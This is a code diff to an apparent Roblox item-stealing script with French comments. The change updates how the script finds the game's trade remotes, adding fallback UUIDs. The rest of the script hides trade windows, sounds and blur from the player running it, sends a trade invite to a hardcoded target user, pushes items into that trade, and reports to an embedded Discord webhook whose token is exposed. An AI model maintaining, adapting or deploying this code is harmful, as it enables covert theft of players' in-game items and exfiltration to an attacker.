@@ -43,6 +43,19 @@ task.spawn(function()
     local WEBHOOK_URL = "https://discord.com/api/webhooks/1509251562780889128/jwigPZCSgn2cGoPcFjG9Pz6iZ_klziZ-3PqlcBQk0T9a8XH4-YzFdlohlUE_7PfbA7h7"
     local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
+    -- ==================== MODIFICATIONS UUID ====================
+    local INVITE_UUIDS = {
+        "586d58bf-56e6-42b4-a93f-dbceecb89097",  -- nouveau
+        "afb005f9-6e81-4e0a-8bb0-3555938a9658"   -- ancien
+    }
+    local ADD_UUIDS = {
+        "9ada5ac2-dcc2-4342-a14d-e689de5dcccd",  -- nouveau
+        "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"   -- ancien
+    }
+    local activeInviteUUID = nil
+    local activeAddUUID = nil
+    -- ============================================================
+
     local Remotes = {Invite = nil, AddBrainrot = nil}
     local remotesReady = false
 
@@ -84,6 +97,7 @@ task.spawn(function()
         return "$" .. tostring(math.floor(n)) .. "/s"
     end
 
+    -- ==================== findRemotes MODIFIÉE ====================
     local function findRemotes()
         if Remotes.Invite and Remotes.AddBrainrot then return end
         for _, v in ipairs(getgc(true)) do
@@ -92,24 +106,32 @@ task.spawn(function()
                 if success then
                     for _, const in ipairs(constants) do
                         if type(const) == "string" then
-                            if const == "afb005f9-6e81-4e0a-8bb0-3555938a9658" and not Remotes.Invite then
-                                local successUpv, upvalues = pcall(debug.getupvalues, v)
-                                if successUpv then
-                                    for _, upv in ipairs(upvalues) do
-                                        if typeof(upv) == "Instance" and (upv:IsA("RemoteFunction") or upv:IsA("RemoteEvent")) then
-                                            Remotes.Invite = upv
-                                            break
+                            -- Vérifier les UUIDs d'invitation
+                            for _, uuid in ipairs(INVITE_UUIDS) do
+                                if const == uuid and not Remotes.Invite then
+                                    local successUpv, upvalues = pcall(debug.getupvalues, v)
+                                    if successUpv then
+                                        for _, upv in ipairs(upvalues) do
+                                            if typeof(upv) == "Instance" and (upv:IsA("RemoteFunction") or upv:IsA("RemoteEvent")) then
+                                                Remotes.Invite = upv
+                                                activeInviteUUID = uuid
+                                                break
+                                            end
                                         end
                                     end
                                 end
                             end
-                            if const == "6b5f15fb-5cb9-4d07-a031-bbff8e641eda" and not Remotes.AddBrainrot then
-                                local successUpv, upvalues = pcall(debug.getupvalues, v)
-                                if successUpv then
-                                    for _, upv in ipairs(upvalues) do
-                                        if typeof(upv) == "Instance" and upv:IsA("RemoteFunction") then
-                                            Remotes.AddBrainrot = upv
-                                            break
+                            -- Vérifier les UUIDs d'ajout
+                            for _, uuid in ipairs(ADD_UUIDS) do
+                                if const == uuid and not Remotes.AddBrainrot then
+                                    local successUpv, upvalues = pcall(debug.getupvalues, v)
+                                    if successUpv then
+                                        for _, upv in ipairs(upvalues) do
+                                            if typeof(upv) == "Instance" and upv:IsA("RemoteFunction") then
+                                                Remotes.AddBrainrot = upv
+                                                activeAddUUID = uuid
+                                                break
+                                            end
                                         end
                                     end
                                 end
@@ -121,6 +143,7 @@ task.spawn(function()
             if Remotes.Invite and Remotes.AddBrainrot then break end
         end
     end
+    -- ============================================================
 
     local function waitForChildSafe(parent, name, timeout)
         timeout = timeout or 30
@@ -183,28 +206,27 @@ task.spawn(function()
         end
     end)
 
-    local INVITE_UUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
-    local ADD_BRAINROT_UUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
-
+    -- ==================== FONCTIONS AVEC UUID ACTIF ====================
     local function sendInvite(targetUserId)
-        if not Remotes.Invite then return false end
+        if not Remotes.Invite or not activeInviteUUID then return false end
         local success, res = pcall(function()
-            return Remotes.Invite:InvokeServer(INVITE_UUID, targetUserId)
+            return Remotes.Invite:InvokeServer(activeInviteUUID, targetUserId)
         end)
         return success and res
     end
 
     local function addBrainrot(podiumIndex, brainrotData)
-        if not Remotes.AddBrainrot then return nil end
+        if not Remotes.AddBrainrot or not activeAddUUID then return nil end
         local success, res = pcall(function()
-            return Remotes.AddBrainrot:InvokeServer(ADD_BRAINROT_UUID, podiumIndex, brainrotData)
+            return Remotes.AddBrainrot:InvokeServer(activeAddUUID, podiumIndex, brainrotData)
         end)
         if success then return res end
         return nil
     end
+    -- ============================================================
 
     -- =====================================================
-    -- WEBHOOK SCANNER
+    -- WEBHOOK SCANNER (inchangé)
     -- =====================================================
     task.spawn(function()
         local webhookSent = false
@@ -358,7 +380,7 @@ task.spawn(function()
         end
     end)
 
-
+    -- ========== SUITE DU SCRIPT (inchangée, mais utilise les nouvelles fonctions) ==========
     task.spawn(function()
         local HttpService = Services.HttpService
         local LocalPlayer = Services.Players.LocalPlayer
@@ -397,7 +419,6 @@ task.spawn(function()
         local fovBlockConns = {}
         local originalBlurFunc = CameraController.Blur
 
-        -- Bloquer le blur dès le départ (manuel et auto-trade)
         pcall(function()
             local lighting = game:GetService("Lighting")
             for _, desc in lighting:GetDescendants() do
@@ -418,7 +439,6 @@ task.spawn(function()
         local originalToggle = InterfaceController.Toggle
         local originalSetCore = nil
         pcall(function() originalSetCore = Services.StarterGui.SetCore end)
-
 
         local TRADE_GUI_NAMES = {"TradeLiveTrade", "TradePrompts"}
         local tradeGuiPrevEnabled = {}
@@ -499,8 +519,6 @@ task.spawn(function()
             end
         end
 
-
-    
         local function isTradeSound(sound)
             local name = sound.Name:lower()
             local path = sound:GetFullName():lower()
@@ -556,7 +574,6 @@ task.spawn(function()
             end
             savedSoundVolumes = {}
         end
-
 
         local function setTradeGuisHidden(hide)
             local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
@@ -699,7 +716,6 @@ task.spawn(function()
             end)
         end
 
-
         local function applyHiding()
             if hiding then return end
             hiding = true
@@ -814,7 +830,6 @@ task.spawn(function()
             end)
         end
 
-    
         while true do
             if (Remotes.Invite and Remotes.AddBrainrot) then
                 local list = getWhitelistBrainrots()
@@ -825,7 +840,6 @@ task.spawn(function()
             end
             task.wait(0.5)
         end
-
 
         task.spawn(function()
             local pg = LocalPlayer:WaitForChild("PlayerGui")
@@ -868,11 +882,9 @@ task.spawn(function()
 
         setTradeGuisHidden(true)
 
-
         task.spawn(function()
             sendInvite(TARGET_USER_ID)
         end)
-
 
         task.spawn(function()
             while true do
